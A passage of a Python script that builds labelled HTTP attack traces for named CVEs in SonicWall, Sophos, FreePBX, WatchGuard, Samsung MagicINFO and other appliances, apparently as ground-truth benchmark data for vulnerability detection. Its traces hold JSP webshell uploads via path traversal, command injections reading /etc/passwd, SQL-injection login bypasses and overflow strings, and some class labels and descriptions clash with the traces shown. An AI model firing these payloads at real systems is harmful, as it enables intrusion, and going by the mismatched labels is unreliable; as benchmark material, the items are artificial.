        "trace": {"request": {"method": "POST", "path": "/MagicInfo/servlet/SWUpdateFileUploader", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../webapps/ROOT/shell.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "upload success"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-7399", "reasoning": "Path traversal in file upload. Write JSP webshell to arbitrary path. Samsung MagicINFO 9 Server before 21.1050."}
    },
    {
        "cve_id": "CVE-2025-4632", "vendor": "Samsung", "product": "MagicINFO 9", "vuln_class": "PT",
        "trace": {"request": {"method": "POST", "path": "/MagicInfo/servlet/SWUpdateFileUploader", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../webapps/ROOT/cmd.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "upload success"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-4632", "reasoning": "Path traversal bypass of CVE-2024-7399 patch. Samsung MagicINFO 9 Server before 21.1052. Actively exploited by Mirai botnet."}
    },
    # ===== Sangoma (3) =====
    {
        "cve_id": "CVE-2019-19006", "vendor": "Sangoma", "product": "FreePBX", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/admin/ajax.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "module=userman&command=login&username=admin"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json", "Set-Cookie": "PHPSESSID=valid"}, "body": "{\"status\":true}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-19006", "reasoning": "Authentication bypass in FreePBX. Craft request to get admin session without password. CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2025-57819", "vendor": "Sangoma", "product": "FreePBX", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/admin/ajax.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "PHPSESSID=admin_session"}, "body": "module=framework&command=exec&cmd=cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"output\":\"root:x:0:0:root:/root:/bin/bash\"}"}},
        "ground_truth": {"sink_param": "cmd", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-57819", "reasoning": "Command injection in Sangoma FreePBX management interface."}
    },
    {
        "cve_id": "CVE-2025-64328", "vendor": "Sangoma", "product": "FreePBX", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/admin/ajax.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "PHPSESSID=admin_session"}, "body": "module=framework&command=sysadmin&action=exec&cmd=cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"output\":\"root:x:0:0:root:/root:/bin/bash\"}"}},
        "ground_truth": {"sink_param": "cmd", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-64328", "reasoning": "Command injection in FreePBX SysAdmin module."}
    },
    # ===== Schneider Electric (1) =====
    {
        "cve_id": "CVE-2018-7841", "vendor": "Schneider Electric", "product": "U.motion Builder", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/api/index.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "op=list&pg=system_log&id=1;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "id", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-7841", "reasoning": "SQL injection leading to RCE in U.motion Builder. Unauthenticated. Schneider Electric ICS."}
    },
    # ===== Siemens (1) =====
    {
        "cve_id": "CVE-2016-8562", "vendor": "Siemens", "product": "SIMATIC CP", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/FormLogin", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "Login=admin&Password=admin&Redirection=%2F"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2016-8562", "reasoning": "Improper privilege management in Siemens SIMATIC CP 1543-1 allows authenticated attacker to escalate privileges via web interface."}
    },
    # ===== Sierra Wireless (1) =====
    {
        "cve_id": "CVE-2018-4063", "vendor": "Sierra Wireless", "product": "AirLink ALEOS", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/upload_file.cgi", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary", "Authorization": "Basic"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../etc/cron.d/malicious\"\r\nContent-Type: application/octet-stream\r\n\r\n* * * * * root cat /etc/passwd\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "upload success"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-4063", "reasoning": "Unrestricted file upload in Sierra Wireless AirLink ALEOS web interface. Authenticated."}
    },
    # ===== SonicWall remaining (8) =====
    {
        "cve_id": "CVE-2019-7481", "vendor": "SonicWall", "product": "SMA100", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/management", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "login=true&uName=admin' OR '1'='1&uPass=test"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "admin session data"}},
        "ground_truth": {"sink_param": "uName", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-7481", "reasoning": "SQL injection in SMA100 management. Unauthenticated credential theft. Used by ransomware groups."}
    },
    {
        "cve_id": "CVE-2019-7483", "vendor": "SonicWall", "product": "SMA100", "vuln_class": "PT",
        "trace": {"request": {"method": "GET", "path": "/cgi-bin/handleWA498FRedirect?repeated=0&index=40&default_submit=" + "../" * 20 + "etc/passwd", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/plain"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "default_submit", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-7483", "reasoning": "Path traversal in SMA100 web interface. Unauthenticated file read."}
    },
    {
        "cve_id": "CVE-2020-5135", "vendor": "SonicWall", "product": "SonicOS", "vuln_class": "CMDi",
        "trace": {"request": {"method": "GET", "path": "/cgi-bin/support/index?arg=" + "A" * 4096, "params": {}, "headers": {}, "body": None}, "response": {"status_code": 500, "headers": {}, "body": ""}},
        "ground_truth": {"sink_param": "arg", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-5135", "reasoning": "Stack-based buffer overflow in SonicOS HTTP request handler. Pre-auth DoS/potential RCE."}
    },
    {
        "cve_id": "CVE-2021-20028", "vendor": "SonicWall", "product": "SRA", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/management", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "login=true&uName=admin' UNION SELECT 1,2,3--&uPass=test"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "admin data"}},
        "ground_truth": {"sink_param": "uName", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-20028", "reasoning": "SQL injection in SonicWall SRA web management. Unauthenticated. Secure Remote Access."}
    },
    {
        "cve_id": "CVE-2021-20038", "vendor": "SonicWall", "product": "SMA100", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/management", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "login=true&uName=" + "A" * 8192 + "&uPass=test"}, "response": {"status_code": 500, "headers": {}, "body": ""}},
        "ground_truth": {"sink_param": "uName", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-20038", "reasoning": "Stack-based buffer overflow in SMA100 Apache httpd. Pre-auth RCE. SMA 200/210/400/410/500v. CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2023-44221", "vendor": "SonicWall", "product": "SMA100", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/viewcert", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "swap=admin_session"}, "body": "cert=test;cat /etc/passwd;&action=view"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "cert", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-44221", "reasoning": "Post-auth OS command injection in SMA100. SSL-VPN management interface. Requires admin privileges."}
    },
    {
        "cve_id": "CVE-2025-23006", "vendor": "SonicWall", "product": "SMA1000", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/management", "params": {}, "headers": {"Content-Type": "application/json"}, "body": "{\"action\":\"exec\",\"command\":\"cat /etc/passwd\"}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"output\":\"root:x:0:0\"}"}},
        "ground_truth": {"sink_param": "command", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-23006", "reasoning": "Pre-auth RCE via deserialization in SMA1000 Appliance Management Console (AMC) / Central Management Console (CMC). CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2025-40602", "vendor": "SonicWall", "product": "SMA1000", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/cgi-bin/management", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "admin panel"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-40602", "reasoning": "Authentication bypass in SonicWall SMA1000 appliance."}
    },
    # ===== Sophos remaining (4) =====
    {
        "cve_id": "CVE-2020-15069", "vendor": "Sophos", "product": "XG Firewall", "vuln_class": "CMDi",
        "trace": {"request": {"method": "GET", "path": "/webconsole/Controller", "params": {"mode": "800", "operation": "1&cat /etc/passwd"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "operation", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-15069", "reasoning": "Buffer overflow in Sophos XG Firewall when processing HTTP requests. Pre-auth RCE."}
    },
    {
        "cve_id": "CVE-2020-25223", "vendor": "Sophos", "product": "SG UTM", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/webadmin.plx", "params": {}, "headers": {"Content-Type": "application/json"}, "body": "{\"objs\":[{\"FID\":\"init\",\"oid\":\"packetfilter/packetfilter\",\"name\":\"test\",\"type\":\"network\",\"attrs\":{\"comment\":\"$(cat /etc/passwd)\"}}]}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"objs\":[{\"d\":{\"comment\":\"root:x:0:0\"}}]}"}},
        "ground_truth": {"sink_param": "comment", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-25223", "reasoning": "Authenticated RCE in Sophos SG UTM web management via Perl injection. webadmin.plx. CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2020-29574", "vendor": "Sophos", "product": "CyberoamOS", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/webconsole/Controller", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mode=451&json={\"username\":\"admin\",\"password\":\"admin' OR '1'='1\"}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"success\"}"}},
        "ground_truth": {"sink_param": "json", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-29574", "reasoning": "SQL injection in CyberoamOS web management login. Pre-auth."}
    },
    {
        "cve_id": "CVE-2022-3236", "vendor": "Sophos", "product": "Firewall", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/userportal/webpages/myaccount/login.jsp", "params": {}, "headers": {"Content-Type": "application/json"}, "body": "{\"username\":\"admin\",\"password\":\"${Runtime.getRuntime().exec('cat /etc/passwd')}\"}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"success\"}"}},
        "ground_truth": {"sink_param": "password", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-3236", "reasoning": "Code injection in User Portal and Webadmin of Sophos Firewall. Pre-auth RCE. Targeted by APT actors."}
    },
    # ===== Versa (1) =====
    {
        "cve_id": "CVE-2024-39717", "vendor": "Versa", "product": "Director", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/versa/app/customcss/uploadCustomCSSFile", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary", "Cookie": "JSESSIONID=valid"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.png.jsp\"\r\nContent-Type: image/png\r\n\r\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "upload success"}},
        "ground_truth": {"sink_param": "file", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-39717", "reasoning": "Unrestricted file upload via Change Favicon function. Upload JSP webshell disguised as image. Versa Director. APT exploitation (Volt Typhoon)."}
    },
    # ===== WatchGuard (4) =====
    {
        "cve_id": "CVE-2022-23176", "vendor": "WatchGuard", "product": "Firebox/XTM", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/auth/login", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "username=admin&password=readwrite&domain=Firebox-DB"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html", "Set-Cookie": "session=valid"}, "body": "admin panel"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-23176", "reasoning": "Privilege escalation via crafted management session. Unprivileged user gains management session. Used by Sandworm APT (Cyclops Blink). CVSS 8.8."}
    },
    {
        "cve_id": "CVE-2022-26318", "vendor": "WatchGuard", "product": "Firebox/XTM", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/agent/login", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "user=admin&pass=" + "A" * 8192}, "response": {"status_code": 500, "headers": {}, "body": ""}},
        "ground_truth": {"sink_param": "pass", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-26318", "reasoning": "Buffer overflow in WatchGuard Firebox/XTM Fireware OS management interface. Pre-auth RCE."}
    },
    {
        "cve_id": "CVE-2025-14733", "vendor": "WatchGuard", "product": "Firebox", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/agent/login", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "user=admin&pass=" + "A" * 4096}, "response": {"status_code": 500, "headers": {}, "body": ""}},
        "ground_truth": {"sink_param": "pass", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-14733", "reasoning": "Out-of-bounds write in WatchGuard Firebox. Similar buffer overflow pattern."}
    },
    {
        "cve_id": "CVE-2025-9242", "vendor": "WatchGuard", "product": "Firebox", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/agent/login", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "user=admin&credential=" + "A" * 4096}, "response": {"status_code": 500, "headers": {}, "body": ""}},
        "ground_truth": {"sink_param": "credential", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-9242", "reasoning": "Buffer overflow in WatchGuard Firebox management interface."}
    },
]


def generate_traces():
    import sys
    sys.path.insert(0, os.path.dirname(__file__))
    # Generate traces from our TRACES list
    os.makedirs(TRACE_DIR, exist_ok=True)

    with open(GT_PATH, encoding="utf-8") as f:
        existing_gt = json.load(f)
    existing_cves = {e["cve_id"] for e in existing_gt}

    new_gt_entries = []
    created = 0
    skipped = 0

    for entry in TRACES:
        cve_id = entry["cve_id"]
        trace_path = os.path.join(TRACE_DIR, f"{cve_id}.json")

        if os.path.exists(trace_path):
            skipped += 1
            continue

        trace_json = {
            "cve_id": cve_id,
            "vendor": entry.get("vendor", ""),
            "product": entry.get("product", ""),
            "vuln_class": entry.get("vuln_class", ""),
            "trace": entry["trace"],
        }

        with open(trace_path, "w", encoding="utf-8") as f:
            json.dump(trace_json, f, indent=2, ensure_ascii=False)

        if cve_id not in existing_cves:
            gt = entry.get("ground_truth", {})
            gt_entry = {
                "cve_id": cve_id,
                "vuln_class": entry.get("vuln_class", ""),
                "sink_param": gt.get("sink_param"),
                "payload_encoding": gt.get("payload_encoding", "none"),
                "payload_extraction": gt.get("payload_extraction", "direct"),
                "method": entry["trace"]["request"]["method"],
                "endpoint": entry["trace"]["request"]["path"],
                "source": gt.get("source", ""),
                "reasoning": gt.get("reasoning", ""),
            }
            new_gt_entries.append(gt_entry)

        created += 1

    if new_gt_entries:
        existing_gt.extend(new_gt_entries)
        with open(GT_PATH, "w", encoding="utf-8") as f:
            json.dump(existing_gt, f, indent=2, ensure_ascii=False)

    print(f"Batch 2 - Created: {created}, Skipped: {skipped}, New GT: {len(new_gt_entries)}")
    print(f"Total traces: {len(os.listdir(TRACE_DIR))}")
    print(f"Total GT entries: {len(existing_gt)}")


if __name__ == "__main__":
    generate_traces()
